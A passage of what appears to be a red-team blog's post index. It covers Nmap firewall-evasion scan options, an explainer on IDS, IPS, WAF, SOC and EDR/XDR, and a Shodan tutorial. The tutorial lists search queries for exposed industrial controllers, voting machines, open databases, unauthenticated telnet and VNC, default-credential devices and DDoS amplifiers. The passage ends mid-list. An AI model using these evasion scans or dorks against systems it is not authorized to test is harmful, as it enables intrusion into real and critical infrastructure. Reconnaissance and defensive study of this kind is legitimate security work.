to avoid that kind of detection you can use the command --data-length to add additional data and to send packets with different size than the default. In the image below we have changed the packet size by adding 25 more bytes.Random ScanShuffles each group of 16384 hosts before scanning. Combined with the slow timing options in Nmap, this technique can be very effective when you don’t want to alert the firewall. This scan is quite slow when scanning large IP ranges.sudo nmap -sV -p- --open -Pn -n --randomize-hosts -T4 192.168.x.x/24Using Multiple Techniqueshttps://pentestlab.blog/2012/04/02/nmap-techniques-for-avoiding-firewalls/Firewall Evasion Techniques using Nmap (https://infosecwriteups.com/firewall-evasion-techniques-using-nmap-523dd18b1b1c)" }, { "title": "Security Devices and Software types to Detect Scans", "url": "/posts/security-devices-and-software-types-to-detect-scans/", "categories": "red team, reconing", "tags": "security devices, attack detection mechanism, IDS, IPS, firewall, waf, red-team", "date": "2022-12-05 00:00:00 +0300", "snippet": "Security Devices and Software types to Detect Scans are as follows: IDS (Intrusion Detection System) IPS (Intrusion Prevention System) Firewall WAF (Web Application Firewall) SOC (Cyber Operation Center)IDSDiagram: Traffic flow of a hacker triggering an IDS solutionAn Intrusion Detection System (IDS) is a system that monitors network traffic for suspicious activity and issues alerts when such activity is discovered. It is a software application that scans a network or a system for the harmful activity or policy breaching. Any malicious venture or violation is normally reported either to an administrator or collected centrally using a security information and event management (SIEM) system.Intrusion prevention systems also monitor network packets inbound the system to check the malicious activities involved in it and at once send the warning notifications. IDS are classified into 5 types:Network Intrusion Detection System (NIDS)Network intrusion detection systems (NIDS) are set up at a planned point within the network to examine traffic from all devices on the network. It performs an observation of passing traffic on the entire subnet and matches the traffic that is passed on the subnets to the collection of known attacks. Once an attack is identified or abnormal behavior is observed, the alert can be sent to the administrator. An example of a NIDS is installing it on the subnet where firewalls are located in order to see if someone is trying to crack the firewall.Host Intrusion Detection System (HIDS)Host intrusion detection systems (HIDS) run on independent hosts or devices on the network. A HIDS monitors the incoming and outgoing packets from the device only and will alert the administrator if suspicious or malicious activity is detected. It takes a snapshot of existing system files and compares it with the previous snapshot. If the analytical system files were edited or deleted, an alert is sent to the administrator to investigate. An example of HIDS usage can be seen on mission-critical machines, which are not expected to change their layout.Protocol-based Intrusion Detection System (PIDS)Protocol-based intrusion detection system (PIDS) comprises a system or agent that would consistently resides at the front end of a server, controlling and interpreting the protocol between a user/device and the server. It is trying to secure the web server by regularly monitoring the HTTPS protocol stream and accept the related HTTP protocol. As HTTPS is un-encrypted and before instantly entering its web presentation layer then this system would need to reside in this interface, between to use the HTTPS.Application Protocol-based Intrusion Detection System (APIDS)Application Protocol-based Intrusion Detection System (APIDS) is a system or agent that generally resides within a group of servers. It identifies the intrusions by monitoring and interpreting the communication on application-specific protocols. For example, this would monitor the SQL protocol explicit to the middleware as it transacts with the database in the web server.Hybrid Intrusion Detection SystemHybrid intrusion detection system is made by the combination of two or more approaches of the intrusion detection system. In the hybrid intrusion detection system, host agent or system data is combined with network information to develop a complete view of the network system. Hybrid intrusion detection system is more effective in comparison to the other intrusion detection system. Prelude is an example of Hybrid IDS.Detection Method of IDSSignature-based MethodSignature-based IDS detects the attacks on the basis of the specific patterns such as number of bytes or number of 1’s or number of 0’s in the network traffic. It also detects on the basis of the already known malicious instruction sequence that is used by the malware. The detected patterns in the IDS are known as signatures.Signature-based IDS can easily detect the attacks whose pattern (signature) already exists in system but it is quite difficult to detect the new malware attacks as their pattern (signature) is not known.Anomaly-based MethodAnomaly-based IDS was introduced to detect unknown malware attacks as new malware are developed rapidly. In anomaly-based IDS there is use of machine learning to create a trustful activity model and anything coming is compared with that model and it is declared suspicious if it is not found in model. Machine learning-based method has a better-generalized property in comparison to signature-based IDS as these models can be trained according to the applications and hardware configurations.IPSDiagram: Traffic flow of a hacker triggering an IPS solutionIntrusion Prevention System is also known as Intrusion Detection and Prevention System. It is a network security application that monitors network or system activities for malicious activity. Major functions of intrusion prevention systems are to identify malicious activity, collect information about this activity, report it and attempt to block or stop it.Intrusion prevention systems are contemplated as augmentation of Intrusion Detection Systems (IDS) because both IPS and IDS operate network traffic and system activities for malicious activity.IPS typically record information related to observed events, notify security administrators of important observed events and produce reports. Many IPS can also respond to a detected threat by attempting to prevent it from succeeding. They use various response techniques, which involve the IPS stopping the attack itself, changing the security environment or changing the attack’s content. IPS are classified into 4 types:Network-based intrusion prevention system (NIPS)It monitors the entire network for suspicious traffic by analyzing protocol activity.Wireless intrusion prevention system (WIPS)It monitors a wireless network for suspicious traffic by analyzing wireless networking protocols.Network behavior analysis (NBA):It examines network traffic to identify threats that generate unusual traffic flows, such as distributed denial of service attacks, specific forms of malware and policy violations.Host-based intrusion prevention system (HIPS):It is an inbuilt software package which operates a single host for doubtful activity by scanning events that occur within that host.IDS vs IPS, what are the differences?The IDS and IPS both analyze network packets and compare the contents to a known threat database. The key high-level difference is that an IDS is a monitoring system, while IPS is a control system.An IDS doesn’t alter packets, it is a passive “listen-only” detection and monitoring solution that doesn’t take action on it’s own.Where an IPS is a control system that accepts or rejects packets based on the ruleset, actively preventing packet delivery based on the contents, similar to a firewall preventing traffic by IP address.IDS deployments do require admin staff or another system like a SIEM to analyze the results and take the appropriate action. The IDS cannot take automatic actions against hackers capable of exploiting these vulnerabilities once they enter the network, leaving the IDS inadequate for threat prevention. IDS typically are positioned as a post-mortem forensics tool for the SecOps or computer security incident response team (CSIRT) for security incident investigations.The IPS, on the other hand, is designed to catch dangerous packets in the act and drop them before they reach their target. Acting on its own to make decisions, which requires regularly updating the database with new threat data.There are a few things to note about both IDS and IPS they are only as effective as their threat databases, and need to be kept updated when new attacks break out.And, why are these two different tools? The IDS was originally developed as a listen-only monitoring tool because the analysis required could not keep pace with the direct communications traffic of the network infrastructure. And that is where it has stayed, a forensics detection solution, while the IPS was developed to take it a step further to actively block.Yes, there are vendors that provide both IDS and IPS functionality in one. There are solutions that have integrated IPS systems with firewalls creating a Unified Threat Management (UTM) technology. But both IDS and IPS have found their use as the go-to tools for Modern Security Stacks.FirewallFirewalls prevent unauthorized access to networks through software or firmware. By utilizing a set of rules, the firewall examines and blocks incoming and outgoing traffic.Fencing your property protects your house and keeps trespassers at bay; similarly, firewalls are used to secure a computer network. Firewalls are network security systems that prevent unauthorized access to a network. It can be a hardware or software unit that filters the incoming and outgoing traffic within a private network, according to a set of rules to spot and prevent cyberattacks.The most important function of a firewall is that it creates a border between an external network and the guarded network where the firewall inspects all packets (pieces of data for internet transfer) entering and leaving the guarded network. Once the inspection is completed, a firewall can differentiate between benign and malicious packets with the help of a set of pre-configured rules.The firewall abides such packets, whether they come in a rule set or not, so that they should not enter into the guarded network.This packet form information includes the information source, its destination, and the content. These might differ at every level of the network, and so do the rule sets. Firewalls read these packets and reform them concerning rules to tell the protocol where to send them.A firewall can either be software or hardware. Software firewalls are programs installed on each computer, and they regulate network traffic through applications and port numbers. Meanwhile, hardware firewalls are the equipment established between the gateway and your network. Additionally, you call a firewall delivered by a cloud solution as a cloud firewall.There are multiple types of firewalls based on their traffic filtering methods, structure, and functionality. A few of the types of firewalls are:Packet FilteringA packet filtering firewall controls data flow to and from a network. It allows or blocks the data transfer based on the packet’s source address, the destination address of the packet, the application protocols to transfer the data, and so on.Proxy Service FirewallThis type of firewall protects the network by filtering messages at the application layer. For a specific application, a proxy firewall serves as the gateway from one network to another.Stateful InspectionSuch a firewall permits or blocks network traffic based on state, port, and protocol. Here, it decides filtering based on administrator-defined rules and context.Next-Generation FirewallAccording to Gartner, Inc.’s definition, the next-generation firewall is a deep-packet inspection firewall that adds application-level inspection, intrusion prevention, and information from outside the firewall to go beyond port/protocol inspection and blocking.Unified Threat Management (UTM) FirewallA UTM device generally integrates the capabilities of a stateful inspection firewall, intrusion prevention, and antivirus in a loosely linked manner. It may include additional services and, in many cases, cloud management. UTMs are designed to be simple and easy to use.Threat-Focused NGFWThese firewalls provide advanced threat detection and mitigation. With network and endpoint event correlation, they may detect evasive or suspicious behavior.WAFA web application firewall (WAF) protects web applications from a variety of application layer attacks such as cross-site scripting (XSS), SQL injection, and cookie poisoning, among others. Attacks to apps are the leading cause of breaches they are the gateway to your valuable data. With the right WAF in place, you can block the array of attacks that aim to exfiltrate that data by compromising your systems.https://youtu.be/p8CQcF_9280How does a web application firewall (WAF) work?A WAF protects your web apps by filtering, monitoring, and blocking any malicious HTTP/S traffic traveling to the web application, and prevents any unauthorized data from leaving the app. It does this by adhering to a set of policies that help determine what traffic is malicious and what traffic is safe. Just as a proxy server acts as an intermediary to protect the identity of a client, a WAF operates in similar fashion but in the reverse called a reverse proxy acting as an intermediary that protects the web app server from a potentially malicious client.WAFs can come in the form of software, an appliance, or delivered as-a-service. Policies can be customized to meet the unique needs of your web application or set of web applications. Although many WAFs require you update the policies regularly to address new vulnerabilities, advances in machine learning enable some WAFs to update automatically.The difference between a web application firewall (WAF), an intrusion prevention system (IPS) and a next-generation firewall (NGFW)An IPS is an intrusion prevention system, a WAF is a web application firewall, and an NGFW is a next-generation firewall. What’s the difference between them all?An IPS is a more broadly focused security product. It is typically signature and policy based meaning it can check for well-known vulnerabilities and attack vectors based on a signature database and established policies. The IPS establishes a standard based off the database and policies, then sends alerts when any traffic deviates from the standard. The signatures and policies grow over time as new vulnerabilities are known. In general, IPS protects traffic across a range of protocol types such as DNS, SMTP, TELNET, RDP, SSH, and FTP. IPS typically operates and protects layers 3 and 4. The network and session layers although some may offer limited protection at the application layer (layer 7).A web application firewall (WAF) protects the application layer and is specifically designed to analyze each HTTP/S request at the application layer. It is typically user, session, and application aware, cognizant of the web apps behind it and what services they offer. Because of this, you can think of a WAF as the intermediary between the user and the app itself, analyzing all communications before they reach the app or the user. Traditional WAFs ensure only allowed actions (based on security policy) can be performed. For many organizations, WAFs are a trusted, first line of defense for applications, especially to protect against the OWASP Top 10 the foundational list of the most seen application vulnerabilities. This Top 10 currently includes: Injection attacks Broken Authentication Sensitive data exposure XML External Entities (XXE) Broken Access control Security misconfigurations Cross Site Scripting (XSS) Insecure DeserializationA next-generation firewall (NGFW) monitors the traffic going out to the Internet across web sites, email accounts, and SaaS. Simply put, it’s protecting the user (vs the web application). A NGFW will enforce user-based policies and adds context to security policies in addition to adding features such as URL filtering, anti-virus/anti-malware, and potentially its own intrusion prevention systems (IPS). While a WAF is typically a reverse proxy (used by servers), NGFWs are often forward proxys (used by clients such as a browser).WAF Security ModelsWAFs can use a positive or negative security model, or a combination of the two: Positive security model the positive WAF security model involves a whitelist that filters traffic according to a list of permitted elements and actions anything not on the list is blocked. The advantage of this model is that it can block new or unknown attacks that the developer didn’t anticipate. Negative security model the negative model involves a blacklist that only blocks specific items anything not on the list is allowed. This model is easier to implement but it cannot guarantee that all threats are addressed. It also requires maintaining a potentially long list of malicious signatures. The level of security depends on the number of restrictions implemented.Types of Web Application Firewalls Network-based WAF: Usually hardware-based, it is installed locally to minimize latency. However, this is the most expensive type of WAF and necessitates storing and maintaining physical equipment. Host-based WAF: Can be fully integrated into the software of an application. This option is cheaper than network-based WAFs and is more customizable, but it consumes extensive local server resources, is complex to implement, and can be expensive to maintain. The machine used to run a host-based WAF often needs to be hardened and customized, which can take time and be costly. Cloud-based WAF: An affordable, easily implemented solution, which typically does not require an upfront investment, with users paying a monthly or annual security-as-a-service subscription. A cloud-based WAF can be regularly updated at no extra cost, and without any effort on the part of the user. However, since you rely on a third party to manage your WAF, it is important to ensure cloud-based WAFs have sufficient customization options to match your organization’s business rules.SOC (Security Operations Center)In a data center or large enterprise environment, a SOC is necessary for network security. The SOC is often a physical room within the organization’s office where several employees continually monitor network traffic, alerts, and visualized information that could be used to respond to a potential cyber-incident. The SOC focuses on security of the network rather than network performance and utilizationSOC and SOC engineers perform a few standard functions: 24/7 continual monitoring across the entire environment Preventative maintenance and deployment of cybersecurity appliances Alert ranking to determine priority during incident response Threat response when a cyber-threat is found Containment and eradication of discovered threats Root-cause analysis after a cyber-incident Assessment and management of compliance for various regulationsSOCs will incorporate alerts from various components of the organization: endpoints network equipment firewalls servers (internal or web) cloud resources virtual devices mobile devices applicationsWhat Is A SIEM (Security Information And Event Manager)?A Security Information and Event Management (SEIM) tool: aggregates logs data from various systems stores the information in an organized fashion correlates linked events applies data analytics and machine learning to detect trends detects devices and software centralizes configuration and security management classifies threats for efficient triageSOC and SIEM: what are the differences?SOC stands for Security Operation Center. A SOC focuses on threat monitoring and incident qualification.To achieve this, analysts use a tool called a “SIEM”, for Security Information Management System. A SIEM integrates software used to monitor corporate infrastructures. Analysts configure a set of correlation rules according to the recommended security policy to detect possible threats.EDR: Endpoint Detection ResponseEDR software monitors terminals (computers, tablets, mobile phones, etc.), not the system network.To do this, EDR software analyze the uses made of the monitored terminals, in particular through behavioral analysis. This enables the recognition of behaviors that deviate from a norm after a learning phase. EDR software are also capable of monitoring the exploitation of security flaws.The advantage of EDR solutions is that they allow companies to protect itself against both known (e.g., a virus) and unknown attacks by analyzing suspicious behaviors.NDR: Network Detection and ResponseNDR software provide extended visibility to SOC teams across the network to detect the behavior of potentially hidden attackers targeting physical, virtual, and cloud infrastructures. It complements the EDR and SIEM tools.The NDR approach provides an overview and focuses on the interactions between the different nodes of the network. Obtaining a broader detection context can indeed reveal the full extent of an attack and enable faster and more targeted response actions.XDR: Extended Detection and ResponseXDR software help security teams solve threat visibility problems by centralizing, standardizing, and correlating security data from multiple sources. This approach increases detection capabilities compared to specific terminal detection and response tools (EDR).For example, XDR provides complete visibility by using network data to monitor vulnerable (unmanaged) endpoints that cannot be seen by EDR tools.XDR analyzes data from multiple sources (emails, endpoints, servers, networks, cloud streams…) to validate alerts, reducing false positives and the overall volume of alerts. This correlation of indicators from multiple sources allows XDR to improve the efficiency of security teams.In summary: EDR: provides more detail but less network coverage. NDR: covers the network but does not monitor endpoints. XDR: breaks down the boundaries of detection perimeters, brings automation to accelerate investigations and detect sophisticated attacks.MDR: Managed Detection ResponseThe acronym MDR stands for managed detection and response. These solutions are managed by a cybersecurity provider. They are operated by an internal or outsourced SOC and enable end-to-end addressing of cyber threats.An analyst can perform remediation when a threat is detected and confirmed through automation, including the use of an orchestration tool (SOAR for Security Orchestration Automation and Response). Depending on an entity’s cybersecurity maturity level, it is also entirely possible to automatically apply remediation.These solutions allow an acceleration of the processing of alerts.Sources: https://www.garlandtechnology.com/blog/ids-vs-ips-go-to-tools-for-modern-security-stacks https://www.geeksforgeeks.org/ https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/ https://www.imperva.com/learn/application-security/what-is-web-application-firewall-waf/" }, { "title": "Shodan.io Tutorials for Best Practices", "url": "/posts/shodan-tutorials-for-best-practicies/", "categories": "red team, reconing", "tags": "shodan.io, shodan tutorials, shodan best practicies, enumeration with shodan, shodan usage, red-team", "date": "2022-12-04 00:00:00 +0300", "snippet": "What is Shodan?Shodan (Sentient-Hyper-Optimized-Data-Access-Network) is a search engine. Shodan is a search engine that enables many computer-based systems to be found in the light of various filters. With Shodan, you can scan the internet and detect the systems, devices, devices (desktop, switch, router, servers, etc.) that are open to the internet, and the results you find can be determined by port, type. You can classify them according to their location, port information, banner and service information.Shodan Command-Line InterfaceOnce you have installed shodan CLI tool, to setup your API token just doshodan init &lt;YOUR_API_KEY&gt;Help menualert Manage the network alerts for your account.convert Convert the given input data file into a differentformat.count Returns the number of results for a search.data Bulk data access to Shodan.domain View all available information for a domain.download Download search results and save them in a compressedJSON file.honeyscore Check whether the IP is a honeypot or not.host View all available information for an IP address.info Shows general information about your account.init Initialize the Shodan command-line.myip Print your external IP address.org Manage your organization’s access to Shodan.parse Extract information out of compressed JSON files.radar Real-Time Map of some results as Shodan finds them.scan Scan an IP/ netblock using Shodan.search Search the Shodan database.stats Provide summary information about a search query.stream Stream data in real-time.version Print version of this tool.See information about the host such as where it’s located, what ports are open and which organization owns the IP.shodan host 192.168.x.xExample shodan command-line queryshodan search --fields location.country_code3,ip_str,hostnames --separator :: \"Server: gSOAP/2.8\" \"Content-Length: 583\"Output:Download and parse the search fieldsshodan download mikrotik streetlightshodan parse --fields location.country_code3,ip_str,hostnames --separator :: mikrotik.json.gzshodan download myresults.json.gz 'org:\"Qatar General Electricty and Water Corporation\"'shodan parse --fields ip_str --separator :: myresults.json.gzShodan FiltersGeneral Filters Name Description Type after Only show results after the given date (dd/mm/yyyy) string string asn Autonomous system number string string before Only show results before the given date (dd/mm/yyyy) string string category Available categories: ics, malware string string city Name of the city string string country 2-letter country code string string geo Accepts between 2 and 4 parameters. If 2 parameters: latitude,longitude. If 3 parameters: latitude,longitude,range. If 4 parameters: top left latitude, top left longitude, bottom right latitude, bottom right longitude. string hash Hash of the data property integer integer has_ipv6 True/ False boolean boolean has_screenshot True/ False boolean boolean hostname Full hostname for the device string string ip Alias for net filter string string isp ISP managing the netblock string string net Network range in CIDR notation (ex. 199.4.1.0/24) string string org Organization assigned the netblock string string os Operating system string string port Port number for the service integer string postal Postal code (US-only) string string product Name of the software/ product providing the banner string string region Name of the region/ state string string state Alias for region string string version Version for the product string string vuln CVE ID for a vulnerability string string Telnet Filters Name Description Type telnet.option Search all the options string telnet.do The server requests the client do support these options string telnet.dont The server requests the client to not support these options string telnet.will The server supports these options string telnet.wont The server doesnt support these options string HTTP Filters Name Description Type http.component Name of web technology used on the website string http.component_category Category of web components used on the website string http.html HTML of web banners string http.html_hash Hash of the website HTML integer http.status Response status code integer http.title Title for the web banners website string SSL Filters Name Description Type has_ssl True / False boolean ssl Search all SSL data string ssl.alpn Application layer protocols such as HTTP/2 (“h2”) string ssl.chain_count Number of certificates in the chain integer ssl.version Possible values: SSLv2, SSLv3, TLSv1,TLSv1.1, TLSv1.2 string ssl.cert.alg Certificate algorithm string ssl.cert.expired True / False boolean ssl.cert.extension vNames of extensions in the certificate string ssl.cert.serial Serial number as an integer or hexadecimal string integer / string ssl.cert.pubkey.bits Number of bits in the public key integer ssl.cert.pubkey.type Public key type string ssl.cipher.version SSL version of the preferred cipher string ssl.cipher.bits Number of bits in the preferred cipher integer ssl.cipher.name Name of the preferred cipher string NTP Filters Name Description Type ntp.ip IP addresses returned by monlist string ntp.ip_count Number of IPs returned by initial monlist integer ntp.more True/ False; whether there are more IP addresses to be gathered from monlist boolean ntp.port Port used by IP addresses in monlist integer Awesome Shodan QueriesIndustrial control systems\"[1m[35mWelcome on console\" # C4 Max Commercial Vehicle GPS Trackers\"[2J[H Encartele Confidential\" # Prison Pay Phones\"Cisco IOS\" \"ADVIPSERVICESK9_LI-M\" # Telcos Running Cisco Lawful Intercept Wiretaps\"Cobham SATCOM\" OR (\"Sailor\" \"VSAT\") # Maritime Satellites\"DICOM Server Response\" port:104 # DICOM Medical X-Ray Machines\"HID VertX\" port:4070 # Door / Lock Access Controllers\"in-tank inventory\" port:10001 # Gas Station Pump Controllers\"log off\" \"select the appropriate\" # Railroad Management\"Server: CarelDataServer\" \"200 Document follows\" # CAREL PlantVisor Refrigeration Units\"Server: EIG Embedded Web Server\" \"200 Document follows\" # GaugeTech Electricity Meters \"Server: gSOAP/2.8\" \"Content-Length: 583\" # We can also find electric vehicle chargers\"Server: Microsoft-WinCE\" \"Content-Length: 12581\" # Siemens HVAC Controllers\"Server: Prismview Player\" # Samsung Electronic Billboards\"Siemens, SIMATIC\" port:161 # Siemens Industrial Automation\"voter system serial\" country:US # Voting Machines in the United Stateshttp.title:\"Nordex Control\" \"Windows 2000 5.0 x86\" \"Jetty/3.1 (JSP 1.1; Servlet 2.2; java 1.6.0_14)\" # Nordex Wind Turbine Farmshttp.title:\"Tesla PowerPack System\" http.component:\"d3\" -ga3ca4f2 # Tesla PowerPack Charging Statusmikrotik streetlight # Traffic Light Controllers / Red Light CamerasP372 \"ANPR enabled\" # Automatic License Plate Readersport:5006,5007 product:mitsubishi # And for Mitsubishi Electric, the MELSEC-Q protocol is commonly used by control system machines/networkstitle:\"Slocum Fleet Mission Control\" # Submarine Mission Control Dashboardstitle:\"xzeres wind\" # to find XZERES Wind TurbinesWebcamsACTi # various IP camera and video management system products.has_screenshot:true IP Webcam # another version of the above search, see how the results might differ?Netwave IP Camera Content-Length: 2574 # access to the Netwave make IP cameras.product:Yawcam has_screenshot:true # Yawcam stands for Yet Another WebCAM, free live streaming and webcam software.server: GeoHttpServer # GeoVision (GeoHttpServer) Webcams, older webcam software with some had well documented vulnerabilities.server: VVTK-HTTP-Server # Vivotek IP cameras.server: webcamxp # webcamXP is one of the most popular and commonly encountered network camera software for Windows OS. server: i-Catcher Console # another example of an IP-based CCTV system.server: \"webcam 7\" # webcam 7 cameras; not as popular as the above type, but still they are still popular and encountered out there.title:camera # general search for anything matching the “camera” keyword.title:tm01 # unsecured Linksys webcams, a lot of them with screenshots.title:”Avigilon” # access to the Avigilion brand camera and monitoring devices.Network Camera VB-M600 # Canon manufactured megapixel security cameras.title:ui3 # UI3 is a HTML5 web interface for Blue Iris mentioned above.webcam has_screenshot:true # a general search for any IoT device identified as a webcam that has screenshots available.WVC80N # Linksys WVC80N cameras.WWW-Authenticate: “Merit LILIN Ent. Co., Ltd.” # a UK-based house automation / IP camera provider.Database Searchesproduct:MySQL # broad search for MySQL databases.mongodb port:27017 # MongoDB databases on their default port. Unsecured by default.\"MongoDB Server Information\" port:27017 # another variation of the above search.\"MongoDB Server Information\" port:27017 -authentication # To find MongoDB database servers which have open authentication over the public internet within Shodan, the following search query can be used:\"MongoDB Server Information { \"metrics\":\" # fully open MongoDBs.\"Set-Cookie: mongo-express=\" \"200 OK\" # MongoDB open databases.kibana content-length:217 # Kibana dashboards accessible without authentication.port:\"9200\" all:elastic # Elasticsearch open databases.port:5432 PostgreSQL # remote connections to PostgreSQL servers.product:\"CouchDB\" # Apache CouchDB databases listed.port:\"5984\"+Server: \"CouchDB/2.1.0\" # vulnerable CouchDB where remote code execution may be possible.Network Infrastructuretitle:\"Weave Scope\" http.favicon.hash:567176827 # Weave Scope Dashboards\"Docker Containers:\" port:2375 # Docker APIs\"Docker-Distribution-Api-Version: registry\" \"200 OK\" -gitlab # Docker Private Registries\"dnsmasq-pi-hole\" \"Recursion: enabled\" # Pi-hole Open DNS Servers\"root@\" port:23 -login -password -name -Session # Already Logged-In as root via Telnet\"Android Debug Bridge\" \"Device\" port:5555 # Android Root BridgesLantronix password port:30718 -secured # Lantronix Serial-to-Ethernet Adapter Leaking Telnet Passwords\"Citrix Applications:\" port:1604 # Citrix Virtual Apps\"smart install client active\" # Cisco Smart InstallPBX \"gateway console\" -password port:23 # PBX IP Phone Gatewayshttp.title:\"- Polycom\" \"Server: lighttpd\" # Polycom Video Conferencing\"Polycom Command Shell\" -failed port:23 # Telnet Configuration\"Server: Bomgar\" \"200 OK\" # Bomgar Help Desk Portal\"Intel(R) Active Management Technology\" port:623,664,16992,16993,16994,16995 # Intel Active Management CVE-2017-5689HP-ILO-4 !\"HP-ILO-4/2.53\" !\"HP-ILO-4/2.54\" !\"HP-ILO-4/2.55\" !\"HP-ILO-4/2.60\" !\"HP-ILO-4/2.61\" !\"HP-ILO-4/2.62\" !\"HP-iLO-4/2.70\" port:1900 # HP iLO 4 CVE-2017-12542\"x-owa-version\" \"IE=EmulateIE7\" \"Server: Microsoft-IIS/7.0\" # Exchange 2007\"x-owa-version\" \"IE=EmulateIE7\" http.favicon.hash:442749392 # Exchange 2010\"X-AspNet-Version\" http.title:\"Outlook\" -\"x-owa-version\" # Exchange 2013 / 2016\"X-MS-Server-Fqdn\" # Lync / Skype for BusinessFiles &amp; Directorieshttp.title:\"Index of /\" # open lists of files and directories on various servers.port:80 title:\"Index of /\" # slight variation of the above, note how the results might differ.http.title:\"Index of /\" http.html:\".pem\" # Apache Directory Listings\"220\" \"230 Login successful.\" port:21 # FTP resources potentially accessible without login credentials.230 \"anonymous@ login ok\" # anonymous login allowed to FTP resources.\"Anonymous+access+allowed\" port:\"21\" # as above.vsftpd 2.3.4 # legacy Linux based FTP service with a widely known security vulnerabilityftp port:\"10000\" # Network Data Management Protocol (NDMP), used for backup of network-attached storage (NAS) devices.\"Authentication: disabled\" port:445 product:\"Samba\" # SMB file sharing\"QuickBooks files OverNetwork\" -unix port:445 # default settings for sharing QuickBooks files.filezilla port:\"21\" # popular file sharing software Filezilla.proftpd port:21 # For FTP, querying for proftpd, a popular FTP serverNetwork Attached Storage (NAS)\"Authentication: disabled\" port:445 # SMB (Samba) File Shares\"Authentication: disabled\" NETLOGON SYSVOL -unix port:445 # Specifically domain controllers\"Authentication: disabled\" \"Shared this folder to access QuickBooks files OverNetwork\" -unix port:445 # Concerning default network shares of QuickBooks files\"Set-Cookie: iomega=\" -\"manage/login.html\" -http.title:\"Log In\" # Iomega / LenovoEMC NAS Drives Redirecting sencha port:9000 # Buffalo TeraStation NAS Drives\"Server: Logitech Media Server\" \"200 OK\" # Logitech Media Servers \"X-Plex-Protocol\" \"200 OK\" port:32400 # Plex Media Servers\"CherryPy/5.1.0\" \"/home\" # Tautulli / PlexPy DashboardsVOIP Devices39 voip # some more VoIP services, mostly behind login screensAddPac # an older VoIP provider, nearly exclusively legacy devices.device:\"voip phone\" # more specific search for anything VoIP containing a “phone” keyword.device:\"voip\" # general search for Voice over IP devices.mcu: tandberg # Tandberg is a hardware manufacturer of multi-point control units for video conferencing.Server: MSOS/2.0 mawebserver/1.1 # VoIP media gateway, commonly used by services such as Patton SN4112 FXO.server: snom # Snom is a VoIP provider with some legacy devices online.title:\"openstage\" # Siemens Openstage brand IP phones.title:\"polycom\" # Polycom is another VoIP communication brand.Maritime devicesECDIS # abbreviation for Electronic Chart Display and Information Systems, used in navigation and autopilot systems.inmarsat # as above, but a slightly less known equipment vendor.maritime # general search for anything related to maritime devices.org:marlink # general search; Marlink is the world’s largest maritime satellite communications provider.sailor # another wide search, could yield unrelated results!satcom # another maritime satellite communications services provider.ssl:\"Cobham SATCOM\" # maritime radio and locations systems.title:\"Slocum Fleet Mission Control\" # maritime mission control software.uhp vsat terminal software -password # satellite network router without a password.vsat # abbreviation for “very-small-aperture terminal”, a data transmitter / receiver commonly used by maritime vessels.SSL certificatesssl.cert.subject.cn:*.example.com # to find the IP addresses of company-owned certificates.Legacy Windows operating systemsos:\"Windows 5.0\" # Windows 2000; support ended in 2010.os:\"Windows 5.1\" # Windows XP; support ended in 2014.os:Windows 2003 # Windows Server 2003; support ended in 2015.os:\"Windows Vista\" # Windows Vista; support ended in 2017.os:Windows 2008 # Windows Server 2008; support ended in 2020.os:\"Windows 7\" # Windows 7; support ended in 2020.os:\"Windows 8\" # Windows 8; support ended in 2016.os:Windows 2011 # Windows Home Server 2011; support ended in 2016.os:\"Windows 8.1\" # Windows 8.1; support ended in 2018.os:Windows 2012 # Windows Server 2012; support ended in 2018.Default - Generic credentialsadmin 1234 # basic very unsecure credentials.html:\"def_wirelesspassword\" # default login pages for routers.port:23 console gateway # remote access via Telnet, no password required.test test port:\"80\" # generic test credentials over HTTP.\"authentication disabled\" port:5900,5901 # VNC services without authentication.\"authentication disabled\" \"RFB 003.008\" # no authentication necessary.\"default password\" # speaks for itself…\"polycom command shell\" # possible authentication bypass to Polycom devices.\"root@\" port:23 -login -password -name -Session # accounts already logged in with root privilege over Telnet, port 23.\"server: Bomgar\" \"200 OK\" # Bomgar remote support service.Printershttp 200 server epson -upnp # HTTP accessible Epson printers.port:161 hp # HP printers that can be restarted remotely via port 161.port:23 \"Password is not set\" # open access via Telnet to printers without set passwords.Printer Type: Lexmark # access to control panels for Lexmark make printers.printer # general search for printers.ssl:\"Xerox Generic Root\" # remote access to Xerox printers.title:\"syncthru web service\" # older Samsung printers, not secured by default.\"HP-ChaiSOE\" port:\"80\" # HP LaserJet printers accessible through HTTP.\"Laser Printer FTP Server\" # printers accessible via FTP with anonymous login allowed.\"Location: /main/main.html\" debut # admin pages of Brother printers, not secured.\"Server: CANON HTTP Server\" # Canon printer servers through HTTP connection.\"Server: EPSON-HTTP\" \"200 OK\" # another variation of the above search.Compromised devices and websitesbitcoin has_screenshot:true # searches for the ‘bitcoin’ keyword, where a screenshot is present (useful for RDP screens of endpoints infected with ransomware).hacked # general search for the ‘hacked’ label.http.title:\"0wn3d by\" # resourced labelled as ‘owned’ by a threat agent, hacker group, etc.http.title:\"Hacked by\" # another variation of the same search filter.port:4444 system32 # compromised legacy operating systems. Port 4444 is the default port for Meterpreter # a Metasploit attack payload with an interactive shell for remote code execution.port:\"27017\" \"send_bitcoin_to_retrieve_the_data\" # databases affected by ransomware, with the ransom demand still associated with them.\"attention\"+\"encrypted\"+port:3389 # ransomware infected RDP services.\"hacked by\" # another variation of the above search.\"HACKED FTP server\" # compromised FTP servers.\"HACKED-ROUTER-HELP-SOS-HAD-DEFAULT-PASSWORD\" # compromised hosts with the name changed to that phrase.\"HACKED-ROUTER\" # compromised routers, labelled accordingly.Miscellaneoushttp.html:\"* The wp-config.php creation script uses this file\" # misconfigured WordPress websites.http.title:\"control panel\" # as above, but whatever is labelled as control panels.http.title:\"dashboard\" # literally anything labelled ‘dashboard’, with many not accessible due to security by default.http.title:\"Nordex Control\" # searches for Nordex wind turbine farms.http.title:\"Tesla\" # anything with the term “Tesla” in the banner.solar # controls for solar panels and similar solar devices.\"DICOM Server Response\" port:104 # DICOM medical machinery.\"ETH # Total speed\" # Ethereum cryptocurrency miners.\"in-tank inventory\" port:10001 # petrol pumps, including their physical addresses.\"Server: EIG Embedded Web Server\" \"200 Document follows\" # EIG electricity meters.port:\"11211\" product:\"Memcached\" # UDP amplification attacks leading to huge DDoS attacks\"X-Jenkins\" \"Set-Cookie: JSESSIONID\" http.title:\"Dashboard\" # often the starting point of any software being built for release\"port: 53\" Recursion: Enabled # DNS servers with recursion enabled can be a huge source of network threats.title:\"OctoPrint\" -title:\"Login\" http.favicon.hash:1307375944 # OctoPrint 3D Printer Controllers\"ETH - Total speed\" # Etherium Minershttp.html:\"* The wp-config.php creation script uses this file\" # Misconfigured 